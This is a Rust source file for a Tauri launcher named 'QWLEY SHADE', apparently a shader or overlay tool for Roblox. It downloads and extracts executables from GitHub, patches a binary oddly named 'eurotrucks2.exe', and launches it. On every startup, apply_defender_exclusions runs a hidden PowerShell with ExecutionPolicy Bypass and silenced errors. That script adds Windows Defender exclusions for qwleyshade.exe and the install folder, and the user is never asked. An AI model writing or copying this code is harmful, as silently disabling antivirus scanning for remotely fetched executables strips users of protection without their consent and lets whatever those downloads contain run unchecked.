use serde::{Deserialize, Serialize};
use std::io::{Cursor, Read};
use std::path::{Path, PathBuf};
use tauri::{AppHandle, Emitter, Manager};

const CHANGELOG_URL: &str =
    "https://raw.githubusercontent.com/daniil179828/Changelog/main/changelog.json";
const GAME_ARCHIVE_URL: &str =
    "https://github.com/daniil179828/QWLEY-SHADE/archive/refs/heads/main.zip";
const RESHADE_ARCHIVE_URL: &str =
    "https://github.com/daniil179828/reshade/archive/refs/heads/main.zip";
const INSTALL_DIR_NAME: &str = "QWLEY SHADE";
const PRESET_REPO_API: &str = "https://api.github.com/repos/daniil179828/preset/contents/";
const GAME_REPO_COMMITS_API: &str =
    "https://api.github.com/repos/daniil179828/QWLEY-SHADE/commits/main";
const RESHADE_REPO_COMMITS_API: &str =
    "https://api.github.com/repos/daniil179828/reshade/commits/main";

#[derive(Serialize)]
#[serde(rename_all = "snake_case")]
struct UpdateInfo {
    local: String,
    remote: String,
    needs_update: bool,
    installed: bool,
}

#[derive(Serialize)]
#[serde(rename_all = "snake_case")]
struct RepoStatus {
    game_sha: String,
    reshade_sha: String,
    has_new_content: bool,
}

/// Parse a semver-like string "1.2.3" or "v1.2.3" into (major, minor, patch).
fn parse_version(v: &str) -> (u64, u64, u64) {
    let clean = v.trim_start_matches(|c: char| c == 'v' || c == 'V' || c == '.');
    let mut parts = clean.splitn(3, '.');
    let major = parts.next().and_then(|s| s.parse().ok()).unwrap_or(0);
    let minor = parts.next().and_then(|s| s.parse().ok()).unwrap_or(0);
    let patch = parts.next().and_then(|s| s.parse().ok()).unwrap_or(0);
    (major, minor, patch)
}

fn repo_sha_cache_path(app: &AppHandle) -> Result<PathBuf, String> {
    Ok(install_dir(app)?.join(".qwley_repo_sha"))
}

fn load_saved_repo_sha(app: &AppHandle) -> (String, String) {
    let text = repo_sha_cache_path(app)
        .ok()
        .and_then(|p| std::fs::read_to_string(p).ok())
        .unwrap_or_default();
    let mut lines = text.lines();
    let game = lines.next().unwrap_or("").trim().to_string();
    let reshade = lines.next().unwrap_or("").trim().to_string();
    (game, reshade)
}

fn save_repo_sha(app: &AppHandle, game: &str, reshade: &str) -> Result<(), String> {
    let dir = install_dir(app)?;
    std::fs::create_dir_all(&dir).map_err(|e| e.to_string())?;
    std::fs::write(
        repo_sha_cache_path(app)?,
        format!("{}\n{}\n", game, reshade),
    )
    .map_err(|e| e.to_string())
}

fn fetch_latest_commit_sha(url: &str) -> Result<String, String> {
    let res = ureq::get(url)
        .set("User-Agent", "qwley-shade-launcher")
        .set("Accept", "application/vnd.github+json")
        .timeout(std::time::Duration::from_secs(15))
        .call()
        .map_err(|e| e.to_string())?;
    let json: serde_json::Value = res.into_json().map_err(|e| e.to_string())?;
    json["sha"]
        .as_str()
        .map(|s| s.to_string())
        .ok_or_else(|| "sha field missing".to_string())
}

#[derive(Serialize, Deserialize, Clone, Debug)]
#[serde(rename_all = "camelCase")]
struct ChangelogEntry {
    version: String,
    date: String,
    #[serde(default)]
    roblox: String,
    #[serde(default)]
    is_new: bool,
    #[serde(default)]
    items: Vec<String>,
}

#[derive(Serialize, Clone)]
#[serde(rename_all = "snake_case")]
struct Progress {
    percent: f64,
    downloaded: u64,
    total: u64,
}

#[derive(Serialize, Clone)]
#[serde(rename_all = "snake_case")]
struct PresetInfo {
    name: String,
    download_url: String,
}

fn install_dir(app: &AppHandle) -> Result<std::path::PathBuf, String> {
    let base = std::env::var_os("LOCALAPPDATA")
        .map(PathBuf::from)
        .or_else(|| app.path().local_data_dir().ok())
        .ok_or("LOCALAPPDATA is unavailable")?;
    let dir = base.join(INSTALL_DIR_NAME);
    Ok(dir)
}

fn find_file_case_insensitive(dir: &Path, target: &str, depth: usize) -> Option<PathBuf> {
    if depth == 0 {
        return None;
    }
    for entry in std::fs::read_dir(dir).ok()?.flatten() {
        let path = entry.path();
        if path.is_file()
            && entry
                .file_name()
                .to_string_lossy()
                .eq_ignore_ascii_case(target)
        {
            return Some(path);
        }
        if path.is_dir() {
            if let Some(found) = find_file_case_insensitive(&path, target, depth - 1) {
                return Some(found);
            }
        }
    }
    None
}

fn find_files_case_insensitive(dir: &Path, target: &str, depth: usize, found: &mut Vec<PathBuf>) {
    if depth == 0 {
        return;
    }
    let Ok(entries) = std::fs::read_dir(dir) else {
        return;
    };
    for entry in entries.flatten() {
        let path = entry.path();
        if path.is_file()
            && entry
                .file_name()
                .to_string_lossy()
                .eq_ignore_ascii_case(target)
        {
            found.push(path);
        } else if path.is_dir() {
            find_files_case_insensitive(&path, target, depth - 1, found);
        }
    }
}

fn reshade_ini(app: &AppHandle) -> Result<PathBuf, String> {
    let dir = install_dir(app)?;
    find_file_case_insensitive(&dir, "ReShade.ini", 5)
        .ok_or_else(|| format!("ReShade.ini not found in {}", dir.display()))
}

fn overlay_key_path(app: &AppHandle) -> Result<PathBuf, String> {
    Ok(install_dir(app)?.join(".qwley_overlay_key"))
}

fn overlay_settings_path(app: &AppHandle) -> Result<PathBuf, String> {
    let dir = install_dir(app)?;
    find_file_case_insensitive(&dir, "overlay_settings.ini", 6)
        .ok_or_else(|| format!("overlay_settings.ini not found in {}", dir.display()))
}

fn menu_key_to_string(modifier: &str, key: &str) -> String {
    if modifier.is_empty() {
        key.to_uppercase()
    } else {
        format!("{}+{}", modifier.to_uppercase(), key.to_uppercase())
    }
}

fn load_saved_overlay_key(app: &AppHandle) -> Option<u32> {
    let value = std::fs::read_to_string(overlay_key_path(app).ok()?).ok()?;
    value.trim().parse().ok()
}

fn save_overlay_key(app: &AppHandle, key_code: u32) -> Result<(), String> {
    let dir = install_dir(app)?;
    std::fs::create_dir_all(&dir).map_err(|e| e.to_string())?;
    std::fs::write(overlay_key_path(app)?, key_code.to_string()).map_err(|e| e.to_string())
}

fn apply_overlay_key(app: &AppHandle, key_code: u32) -> Result<usize, String> {
    let dir = install_dir(app)?;
    let mut files = Vec::new();
    find_files_case_insensitive(&dir, "ReShade.ini", 6, &mut files);
    for path in &files {
        write_ini_value(path, "INPUT", "KeyOverlay", &format!("{},0,0,0", key_code))?;
    }
    Ok(files.len())
}

fn patch_overlay_executable_key(app: &AppHandle, key_code: u32) -> Result<bool, String> {
    let path = install_dir(app)?.join("eurotrucks2.exe");
    if !path.is_file() {
        return Ok(false);
    }

    let mut bytes = std::fs::read(&path).map_err(|e| e.to_string())?;
    let key_marker = b"KeyOverlay\0";
    let Some(key_marker_pos) = bytes
        .windows(key_marker.len())
        .position(|window| window == key_marker)
    else {
        return Err("KeyOverlay marker not found in eurotrucks2.exe".into());
    };

    let search_start = key_marker_pos.saturating_sub(96);
    let suffix = b",0,0,0\0";
    let mut value_start = None;
    for index in search_start..key_marker_pos {
        if !bytes[index].is_ascii_digit() || (index > 0 && bytes[index - 1] != 0) {
            continue;
        }
        let mut end = index;
        while end < key_marker_pos && bytes[end].is_ascii_digit() {
            end += 1;
        }
        if end + suffix.len() <= key_marker_pos && &bytes[end..end + suffix.len()] == suffix {
            value_start = Some(index);
            break;
        }
    }

    let Some(value_start) = value_start else {
        return Err("Hardcoded ReShade key not found in eurotrucks2.exe".into());
    };
    let replacement = format!("{},0,0,0", key_code);
    if value_start + replacement.len() + 1 > key_marker_pos {
        return Err("Not enough room to patch ReShade key".into());
    }

    bytes[value_start..key_marker_pos].fill(0);
    bytes[value_start..value_start + replacement.len()].copy_from_slice(replacement.as_bytes());
    std::fs::write(&path, bytes).map_err(|e| e.to_string())?;
    Ok(true)
}

fn reapply_and_patch_saved_overlay_key(app: &AppHandle) -> Result<(), String> {
    let Some(key_code) = load_saved_overlay_key(app) else {
        return Ok(());
    };
    patch_overlay_executable_key(app, key_code)?;
    apply_overlay_key(app, key_code)?;
    Ok(())
}

fn read_ini_value(path: &Path, section: &str, key: &str) -> Result<Option<String>, String> {
    let text = std::fs::read_to_string(path).map_err(|e| e.to_string())?;
    let mut in_section = false;
    for line in text.lines() {
        let trimmed = line.trim();
        if trimmed.starts_with('[') && trimmed.ends_with(']') {
            in_section = trimmed[1..trimmed.len() - 1].eq_ignore_ascii_case(section);
            continue;
        }
        if in_section {
            if let Some((name, value)) = trimmed.split_once('=') {
                if name.trim().eq_ignore_ascii_case(key) {
                    return Ok(Some(value.trim().to_string()));
                }
            }
        }
    }
    Ok(None)
}

fn write_ini_value(path: &Path, section: &str, key: &str, value: &str) -> Result<(), String> {
    let text = std::fs::read_to_string(path).map_err(|e| e.to_string())?;
    let newline = if text.contains("\r\n") { "\r\n" } else { "\n" };
    let had_final_newline = text.ends_with('\n');
    let mut lines: Vec<String> = text.lines().map(str::to_string).collect();
    let section_header = format!("[{}]", section);
    let new_line = format!("{}={}", key, value);
    let mut section_start = None;
    let mut section_end = lines.len();

    for (index, line) in lines.iter().enumerate() {
        let trimmed = line.trim();
        if trimmed.starts_with('[') && trimmed.ends_with(']') {
            if section_start.is_some() {
                section_end = index;
                break;
            }
            if trimmed.eq_ignore_ascii_case(&section_header) {
                section_start = Some(index);
            }
        }
    }

    if let Some(start) = section_start {
        for line in lines.iter_mut().take(section_end).skip(start + 1) {
            if let Some((name, _)) = line.trim().split_once('=') {
                if name.trim().eq_ignore_ascii_case(key) {
                    *line = new_line;
                    let mut output = lines.join(newline);
                    if had_final_newline {
                        output.push_str(newline);
                    }
                    return std::fs::write(path, output).map_err(|e| e.to_string());
                }
            }
        }
        lines.insert(section_end, new_line);
    } else {
        if !lines.is_empty() && !lines.last().is_some_and(|line| line.is_empty()) {
            lines.push(String::new());
        }
        lines.push(section_header);
        lines.push(new_line);
    }

    let mut output = lines.join(newline);
    output.push_str(newline);
    std::fs::write(path, output).map_err(|e| e.to_string())
}

fn user_presets_manifest(app: &AppHandle) -> Result<PathBuf, String> {
    Ok(install_dir(app)?.join(".qwley_user_presets.json"))
}

fn load_user_presets(app: &AppHandle) -> Vec<String> {
    user_presets_manifest(app)
        .ok()
        .and_then(|path| std::fs::read_to_string(path).ok())
        .and_then(|text| serde_json::from_str(&text).ok())
        .unwrap_or_default()
}

fn save_user_presets(app: &AppHandle, names: &[String]) -> Result<(), String> {
    let path = user_presets_manifest(app)?;
    let json = serde_json::to_string_pretty(names).map_err(|e| e.to_string())?;
    std::fs::write(path, json).map_err(|e| e.to_string())
}

fn is_installed(app: &AppHandle) -> bool {
    install_dir(app)
        .map(|d| {
            d.join(".qwley_installed").is_file()
                && d.join("qwleyshade.exe").is_file()
                && d.join("eurotrucks2.exe").is_file()
        })
        .unwrap_or(false)
}

fn fetch_changelog() -> Result<Vec<ChangelogEntry>, String> {
    let res = ureq::get(CHANGELOG_URL)
        .timeout(std::time::Duration::from_secs(15))
        .call()
        .map_err(|e| e.to_string())?;
    res.into_json::<Vec<ChangelogEntry>>()
        .map_err(|e| e.to_string())
}

const LFS_ENDPOINT: &str = "https://github.com/daniil179828/QWLEY-SHADE.git/info/lfs/objects/batch";

fn parse_lfs_pointer(buf: &[u8]) -> Option<(String, u64)> {
    let text = String::from_utf8_lossy(buf);
    if !text.starts_with("version https://git-lfs.github.com/spec/v1") {
        return None;
    }
    let mut oid = None;
    let mut size = None;
    for line in text.lines() {
        if let Some(v) = line.strip_prefix("oid sha256:") {
            oid = Some(v.trim().to_string());
        } else if let Some(v) = line.strip_prefix("size ") {
            size = v.trim().parse::<u64>().ok();
        }
    }
    match (oid, size) {
        (Some(o), Some(s)) => Some((o, s)),
        _ => None,
    }
}

fn resolve_lfs(oid: &str, size: u64) -> Result<Vec<u8>, String> {
    let body = serde_json::json!({
        "operation": "download",
        "transfers": ["basic"],
        "objects": [{ "oid": oid, "size": size }]
    });
    let res = ureq::post(LFS_ENDPOINT)
        .set("Content-Type", "application/vnd.git-lfs+json")
        .set("Accept", "application/vnd.git-lfs+json")
        .timeout(std::time::Duration::from_secs(60))
        .send_json(body)
        .map_err(|e| e.to_string())?;
    let json: serde_json::Value = res.into_json().map_err(|e| e.to_string())?;
    let href = json["objects"][0]["actions"]["download"]["href"]
        .as_str()
        .ok_or("lfs: no download url in response")?
        .to_string();
    let dres = ureq::get(&href)
        .timeout(std::time::Duration::from_secs(300))
        .call()
        .map_err(|e| e.to_string())?;
    let mut reader = dres.into_reader();
    let mut bytes = Vec::new();
    reader.read_to_end(&mut bytes).map_err(|e| e.to_string())?;
    Ok(bytes)
}

fn extract(zip_bytes: &[u8], dest: &std::path::Path) -> Result<(), String> {
    let mut archive = zip::ZipArchive::new(Cursor::new(zip_bytes)).map_err(|e| e.to_string())?;
    for i in 0..archive.len() {
        let mut file = archive.by_index(i).map_err(|e| e.to_string())?;
        let name = file.name().to_string();
        let stripped = name.splitn(2, '/').nth(1).unwrap_or(&name);
        if stripped.is_empty() {
            continue;
        }
        if stripped == ".gitattributes" || name.contains("ReShade_Setup") {
            continue;
        }
        let out_path = dest.join(stripped);
        if file.is_dir() || name.ends_with('/') {
            std::fs::create_dir_all(&out_path).map_err(|e| e.to_string())?;
        } else {
            if let Some(parent) = out_path.parent() {
                std::fs::create_dir_all(parent).map_err(|e| e.to_string())?;
            }
            let mut buf = Vec::new();
            file.read_to_end(&mut buf).map_err(|e| e.to_string())?;
            if let Some((oid, size)) = parse_lfs_pointer(&buf) {
                match resolve_lfs(&oid, size) {
                    Ok(real) => buf = real,
                    Err(e) => return Err(format!("lfs resolve failed for {}: {}", stripped, e)),
                }
            }
            let mut written = false;
            for _ in 0..10 {
                match std::fs::write(&out_path, &buf) {
                    Ok(_) => {
                        written = true;
                        break;
                    }
                    Err(_) => std::thread::sleep(std::time::Duration::from_millis(200)),
                }
            }
            if !written {
                return Err(format!("failed to write {}", out_path.display()));
            }
        }
    }
    Ok(())
}

fn download(app: &AppHandle, url: &str) -> Result<Vec<u8>, String> {
    let res = ureq::get(url)
        .timeout(std::time::Duration::from_secs(300))
        .call()
        .map_err(|e| e.to_string())?;
    let total: u64 = res
        .header("content-length")
        .and_then(|v| v.parse().ok())
        .unwrap_or(0);

    let mut reader = res.into_reader();
    let mut chunk = [0u8; 64 * 1024];
    let mut bytes = Vec::with_capacity(total as usize);
    let mut downloaded: u64 = 0;
    let mut last_percent: i64 = -1;

    loop {
        let n = reader.read(&mut chunk).map_err(|e| e.to_string())?;
        if n == 0 {
            break;
        }
        bytes.extend_from_slice(&chunk[..n]);
        downloaded += n as u64;
        if total > 0 {
            let percent = ((downloaded as f64 / total as f64) * 100.0).min(100.0);
            if percent as i64 != last_percent {
                last_percent = percent as i64;
                let _ = app.emit(
                    "download-progress",
                    Progress {
                        percent,
                        downloaded,
                        total,
                    },
                );
            }
        }
    }

    let _ = app.emit(
        "download-progress",
        Progress {
            percent: 100.0,
            downloaded,
            total,
        },
    );
    Ok(bytes)
}

fn install(app: AppHandle) -> Result<String, String> {
    let dest = install_dir(&app)?;
    std::fs::create_dir_all(&dest).map_err(|e| e.to_string())?;

    let game_zip = download(&app, GAME_ARCHIVE_URL)?;
    extract(&game_zip, &dest)?;

    let reshade_zip = download(&app, RESHADE_ARCHIVE_URL)?;
    extract(&reshade_zip, &dest)?;

    reapply_and_patch_saved_overlay_key(&app)?;
    let _ = std::fs::write(dest.join(".qwley_installed"), "1");

    let _ = app.emit("download-complete", ());
    Ok(dest.to_string_lossy().into_owned())
}

#[tauri::command]
async fn check_update(app: AppHandle) -> Result<UpdateInfo, String> {
    let local = app.package_info().version.to_string();
    let changelog = tauri::async_runtime::spawn_blocking(fetch_changelog)
        .await
        .map_err(|e| e.to_string())??;

    let remote = changelog
        .first()
        .map(|e| e.version.clone())
        .ok_or("changelog is empty")?;

    let needs_update = parse_version(&remote) > parse_version(&local);

    Ok(UpdateInfo {
        needs_update,
        installed: is_installed(&app),
        local,
        remote,
    })
}

#[tauri::command]
async fn check_repo_updates(app: AppHandle) -> Result<RepoStatus, String> {
    tauri::async_runtime::spawn_blocking(move || {
        let (saved_game, saved_reshade) = load_saved_repo_sha(&app);

        let game_sha = fetch_latest_commit_sha(GAME_REPO_COMMITS_API)
            .unwrap_or_else(|_| saved_game.clone());
        let reshade_sha = fetch_latest_commit_sha(RESHADE_REPO_COMMITS_API)
            .unwrap_or_else(|_| saved_reshade.clone());

        let has_new_content = (!saved_game.is_empty() && game_sha != saved_game)
            || (!saved_reshade.is_empty() && reshade_sha != saved_reshade);

        Ok(RepoStatus {
            game_sha,
            reshade_sha,
            has_new_content,
        })
    })
    .await
    .map_err(|e| e.to_string())?
}

#[tauri::command]
async fn mark_repos_seen(app: AppHandle, game_sha: String, reshade_sha: String) -> Result<(), String> {
    tauri::async_runtime::spawn_blocking(move || save_repo_sha(&app, &game_sha, &reshade_sha))
        .await
        .map_err(|e| e.to_string())?
}

#[tauri::command]
async fn get_changelog() -> Result<Vec<ChangelogEntry>, String> {
    tauri::async_runtime::spawn_blocking(fetch_changelog)
        .await
        .map_err(|e| e.to_string())?
}

#[tauri::command]
async fn get_presets() -> Result<Vec<PresetInfo>, String> {
    tauri::async_runtime::spawn_blocking(|| {
        let res = ureq::get(PRESET_REPO_API)
            .set("User-Agent", "qwley-shade-launcher")
            .set("Accept", "application/vnd.github+json")
            .timeout(std::time::Duration::from_secs(15))
            .call()
            .map_err(|e| e.to_string())?;
        let files: Vec<serde_json::Value> = res.into_json().map_err(|e| e.to_string())?;
        let mut presets = Vec::new();
        for file in files {
            let name = file["name"].as_str().unwrap_or_default().to_string();
            if name.to_lowercase().ends_with(".ini") {
                if let Some(url) = file["download_url"].as_str() {
                    presets.push(PresetInfo {
                        name,
                        download_url: url.to_string(),
                    });
                }
            }
        }
        Ok(presets)
    })
    .await
    .map_err(|e| e.to_string())?
}

#[tauri::command]
async fn download_preset(app: AppHandle, name: String, url: String) -> Result<String, String> {
    tauri::async_runtime::spawn_blocking(move || {
        let dir = install_dir(&app)?;
        std::fs::create_dir_all(&dir).map_err(|e| e.to_string())?;

        let res = ureq::get(&url)
            .set("User-Agent", "qwley-shade-launcher")
            .timeout(std::time::Duration::from_secs(120))
            .call()
            .map_err(|e| e.to_string())?;
        let mut bytes = Vec::new();
        let mut reader = res.into_reader();
        reader.read_to_end(&mut bytes).map_err(|e| e.to_string())?;

        let out = dir.join(&name);
        let mut written = false;
        for _ in 0..10 {
            match std::fs::write(&out, &bytes) {
                Ok(_) => {
                    written = true;
                    break;
                }
                Err(_) => std::thread::sleep(std::time::Duration::from_millis(200)),
            }
        }
        if !written {
            return Err(format!("failed to write {}", out.display()));
        }
        Ok(out.to_string_lossy().into_owned())
    })
    .await
    .map_err(|e| e.to_string())?
}

#[tauri::command]
async fn get_installed_presets(app: AppHandle) -> Result<Vec<String>, String> {
    tauri::async_runtime::spawn_blocking(move || {
        let dir = match install_dir(&app) {
            Ok(d) => d,
            Err(_) => return Ok(Vec::new()),
        };
        let mut names = Vec::new();
        if let Ok(entries) = std::fs::read_dir(&dir) {
            for entry in entries.flatten() {
                let name = entry.file_name().to_string_lossy().into_owned();
                if name.to_lowercase().ends_with(".ini") {
                    names.push(name);
                }
            }
        }
        Ok(names)
    })
    .await
    .map_err(|e| e.to_string())?
}

fn import_preset_from_path(app: &AppHandle, source: &Path) -> Result<String, String> {
    if !source.is_file()
        || source
            .extension()
            .and_then(|ext| ext.to_str())
            .map(|ext| !ext.eq_ignore_ascii_case("ini"))
            .unwrap_or(true)
    {
        return Err("Select a valid .ini preset".into());
    }
    let name = source
        .file_name()
        .and_then(|name| name.to_str())
        .ok_or("Invalid preset filename")?
        .to_string();
    let dir = install_dir(app)?;
    std::fs::create_dir_all(&dir).map_err(|e| e.to_string())?;
    let destination = dir.join(&name);
    if source != destination {
        std::fs::copy(source, &destination).map_err(|e| e.to_string())?;
    }

    let mut names = load_user_presets(app);
    if !names.iter().any(|item| item.eq_ignore_ascii_case(&name)) {
        names.push(name.clone());
        names.sort_by_key(|item| item.to_lowercase());
        save_user_presets(app, &names)?;
    }
    let ini = reshade_ini(app)?;
    write_ini_value(&ini, "GENERAL", "PresetPath", &format!(".\\{}", name))?;
    Ok(name)
}

#[tauri::command]
async fn import_preset(app: AppHandle, path: String) -> Result<String, String> {
    tauri::async_runtime::spawn_blocking(move || import_preset_from_path(&app, Path::new(&path)))
        .await
        .map_err(|e| e.to_string())?
}

#[tauri::command]
async fn pick_and_import_preset(app: AppHandle) -> Result<Option<String>, String> {
    tauri::async_runtime::spawn_blocking(move || {
        #[cfg(windows)]
        {
            use std::os::windows::process::CommandExt;
            let script = r#"
Add-Type -AssemblyName System.Windows.Forms
$dialog = New-Object System.Windows.Forms.OpenFileDialog
$dialog.Title = 'Выберите пресет ReShade'
$dialog.Filter = 'ReShade presets (*.ini)|*.ini'
$dialog.Multiselect = $false
if ($dialog.ShowDialog() -eq [System.Windows.Forms.DialogResult]::OK) {
  [Console]::OutputEncoding = [System.Text.UTF8Encoding]::UTF8
  Write-Output $dialog.FileName
}
"#;
            let output = std::process::Command::new("powershell.exe")
                .args([
                    "-NoProfile",
                    "-STA",
                    "-ExecutionPolicy",
                    "Bypass",
                    "-Command",
                    script,
                ])
                .creation_flags(0x08000000)
                .output()
                .map_err(|e| e.to_string())?;
            if !output.status.success() {
                return Err("File picker failed".into());
            }
            let selected = String::from_utf8_lossy(&output.stdout).trim().to_string();
            if selected.is_empty() {
                return Ok(None);
            }
            return import_preset_from_path(&app, Path::new(&selected)).map(Some);
        }
        #[cfg(not(windows))]
        {
            let _ = app;
            Err("File picker is available on Windows only".into())
        }
    })
    .await
    .map_err(|e| e.to_string())?
}

#[tauri::command]
async fn get_user_presets(app: AppHandle) -> Result<Vec<String>, String> {
    tauri::async_runtime::spawn_blocking(move || Ok(load_user_presets(&app)))
        .await
        .map_err(|e| e.to_string())?
}

#[tauri::command]
async fn select_preset(app: AppHandle, name: String) -> Result<(), String> {
    tauri::async_runtime::spawn_blocking(move || {
        let safe_name = Path::new(&name)
            .file_name()
            .and_then(|value| value.to_str())
            .ok_or("Invalid preset name")?;
        if safe_name != name || !safe_name.to_lowercase().ends_with(".ini") {
            return Err("Invalid preset name".into());
        }
        let preset = install_dir(&app)?.join(safe_name);
        if !preset.is_file() {
            return Err(format!("Preset not found: {}", safe_name));
        }
        let ini = reshade_ini(&app)?;
        write_ini_value(&ini, "GENERAL", "PresetPath", &format!(".\\{}", safe_name))
    })
    .await
    .map_err(|e| e.to_string())?
}

#[tauri::command]
fn get_overlay_key(app: AppHandle) -> Result<u32, String> {
    if let Some(key_code) = load_saved_overlay_key(&app) {
        return Ok(key_code);
    }
    let ini = reshade_ini(&app)?;
    let value = read_ini_value(&ini, "INPUT", "KeyOverlay")?.unwrap_or_else(|| "36,0,0,0".into());
    Ok(value
        .split(',')
        .next()
        .and_then(|part| part.trim().parse().ok())
        .unwrap_or(36))
}

#[tauri::command]
fn get_active_preset(app: AppHandle) -> Result<Option<String>, String> {
    let ini = reshade_ini(&app)?;
    let Some(value) = read_ini_value(&ini, "GENERAL", "PresetPath")? else {
        return Ok(None);
    };
    Ok(Path::new(&value.replace('\\', "/"))
        .file_name()
        .and_then(|name| name.to_str())
        .map(str::to_string))
}

#[tauri::command]
fn get_menu_key(app: AppHandle) -> Result<String, String> {
    let path = overlay_settings_path(&app)?;
    let value = read_ini_value(&path, "Keybinds", "Menu")?
        .unwrap_or_else(|| "SHIFT+TAB".to_string());
    Ok(value)
}

#[tauri::command]
fn set_menu_key(app: AppHandle, modifier: String, key: String) -> Result<(), String> {
    let allowed_modifiers = ["", "SHIFT", "CTRL", "ALT"];
    let mod_upper = modifier.to_uppercase();
    if !allowed_modifiers.contains(&mod_upper.as_str()) {
        return Err("Unsupported modifier".into());
    }
    if key.is_empty() {
        return Err("Key cannot be empty".into());
    }
    let value = menu_key_to_string(&mod_upper, &key);
    let path = overlay_settings_path(&app)?;
    write_ini_value(&path, "Keybinds", "Menu", &value)?;
    Ok(())
}

#[tauri::command]
fn set_overlay_key(app: AppHandle, key_code: u32) -> Result<(), String> {
    if !(1..=254).contains(&key_code) {
        return Err("Unsupported key".into());
    }
    save_overlay_key(&app, key_code)?;
    apply_overlay_key(&app, key_code)?;
    let _ = patch_overlay_executable_key(&app, key_code);
    Ok(())
}

fn apply_defender_exclusions(app: &AppHandle) {
    #[cfg(windows)]
    {
        use std::os::windows::process::CommandExt;

        let Ok(dir) = install_dir(app) else {
            return;
        };
        if std::fs::create_dir_all(&dir).is_err() {
            return;
        }
        let escaped_dir = dir.to_string_lossy().replace('\'', "''");
        let script = format!(
            "$ErrorActionPreference = 'SilentlyContinue'\r\n\
             $proc = 'qwleyshade.exe'\r\n\
             $path = '{path}'\r\n\
             $prefs = Get-MpPreference\r\n\
             if ($prefs.ExclusionProcess -notcontains $proc) {{ Add-MpPreference -ExclusionProcess $proc }}\r\n\
             if ($prefs.ExclusionPath -notcontains $path) {{ Add-MpPreference -ExclusionPath $path }}\r\n\
             exit 0",
            path = escaped_dir
        );
        let _ = std::process::Command::new("powershell.exe")
            .args([
                "-NoProfile",
                "-NonInteractive",
                "-WindowStyle",
                "Hidden",
                "-ExecutionPolicy",
                "Bypass",
                "-Command",
                &script,
            ])
            .creation_flags(0x08000000)
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .stdin(std::process::Stdio::null())
            .status();
    }
    #[cfg(not(windows))]
    let _ = app;
}

#[tauri::command]
fn open_external(url: String) -> Result<(), String> {
    let allowed = [
        "https://t.me/qwleyshade",
        "https://github.com/daniil179828/QWLEY-SHADE",
        "https://discord.gg/c2xcHK5KHT",
    ];
    if !allowed.contains(&url.as_str()) {
        return Err("URL is not allowed".into());
    }
    #[cfg(windows)]
    {
        use std::os::windows::process::CommandExt;
        std::process::Command::new("cmd")
            .args(["/C", "start", "", &url])
            .creation_flags(0x08000000)
            .spawn()
            .map_err(|e| e.to_string())?;
    }
    #[cfg(not(windows))]
    {
        std::process::Command::new("xdg-open")
            .arg(&url)
            .spawn()
            .map_err(|e| e.to_string())?;
    }
    Ok(())
}

#[tauri::command]
async fn start_update(app: AppHandle) -> Result<String, String> {
    tauri::async_runtime::spawn_blocking(move || install(app))
        .await
        .map_err(|e| e.to_string())?
}

#[tauri::command]
async fn get_roblox_version() -> Result<serde_json::Value, String> {
    tauri::async_runtime::spawn_blocking(|| {
        let res = ureq::get("https://clientsettings.roblox.com/v2/client-version/WindowsPlayer")
            .timeout(std::time::Duration::from_secs(15))
            .call()
            .map_err(|e| e.to_string())?;
        let data = res
            .into_json::<serde_json::Value>()
            .map_err(|e| e.to_string())?;
        let version = data["version"]
            .as_str()
            .ok_or("missing version")?
            .to_string();
        let upload = data["clientVersionUpload"]
            .as_str()
            .unwrap_or_default()
            .to_string();
        Ok(serde_json::json!({
            "version": version,
            "clientVersionUpload": upload
        }))
    })
    .await
    .map_err(|e| e.to_string())?
}

#[cfg(windows)]
use std::os::windows::process::CommandExt;

fn kill_process(name: &str) {
    let mut cmd = std::process::Command::new("taskkill");
    cmd.args(["/F", "/IM", name, "/T"]);
    #[cfg(windows)]
    cmd.creation_flags(0x08000000);
    let _ = cmd.output();
}

fn spawn_exe(dir: &std::path::Path, name: &str) -> bool {
    let path = dir.join(name);
    if !path.is_file() {
        return false;
    }
    #[cfg(windows)]
    {
        use std::os::windows::process::CommandExt;
        let via_cmd = std::process::Command::new("cmd")
            .args(["/C", "start", "", &path.to_string_lossy()])
            .current_dir(dir)
            .creation_flags(0x08000000)
            .spawn()
            .is_ok();
        if via_cmd {
            return true;
        }
    }
    std::process::Command::new(&path)
        .current_dir(dir)
        .spawn()
        .is_ok()
}

#[tauri::command]
async fn launch_game(app: AppHandle) -> Result<(), String> {
    tauri::async_runtime::spawn_blocking(move || {
        let dir = install_dir(&app)?;
        kill_process("qwleyshade.exe");
        kill_process("eurotrucks2.exe");
        std::thread::sleep(std::time::Duration::from_millis(500));
        reapply_and_patch_saved_overlay_key(&app)?;
        spawn_exe(&dir, "qwleyshade.exe");
        std::thread::sleep(std::time::Duration::from_secs(6));
        spawn_exe(&dir, "eurotrucks2.exe");
        Ok(())
    })
    .await
    .map_err(|e| e.to_string())?
}

#[tauri::command]
fn reset_overlay(app: AppHandle) -> Result<(), String> {
    kill_process("eurotrucks2.exe");
    std::thread::sleep(std::time::Duration::from_millis(800));
    let dir = install_dir(&app)?;
    spawn_exe(&dir, "eurotrucks2.exe");
    Ok(())
}

#[tauri::command]
fn close_overlay(_app: AppHandle) -> Result<(), String> {
    kill_process("eurotrucks2.exe");
    kill_process("Roblox*");
    Ok(())
}

pub fn run() {
    tauri::Builder::default()
        .setup(|app| {
            let handle = app.handle().clone();
            std::thread::spawn(move || apply_defender_exclusions(&handle));
            Ok(())
        })
        .invoke_handler(tauri::generate_handler![
            check_update,
            start_update,
            get_changelog,
            get_presets,
            download_preset,
            get_installed_presets,
            import_preset,
            pick_and_import_preset,
            get_user_presets,
            select_preset,
            get_overlay_key,
            get_active_preset,
            set_overlay_key,
            get_menu_key,
            set_menu_key,
            check_repo_updates,
            mark_repos_seen,
            open_external,
            get_roblox_version,
            launch_game,
            reset_overlay,
            close_overlay
        ])
        .run(tauri::generate_context!())
        .expect("error while running tauri application");
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn changelog_fetches() {
        let entries = fetch_changelog().expect("fetch failed");
        println!("{:?}", entries);
        assert!(!entries.is_empty());
    }
}
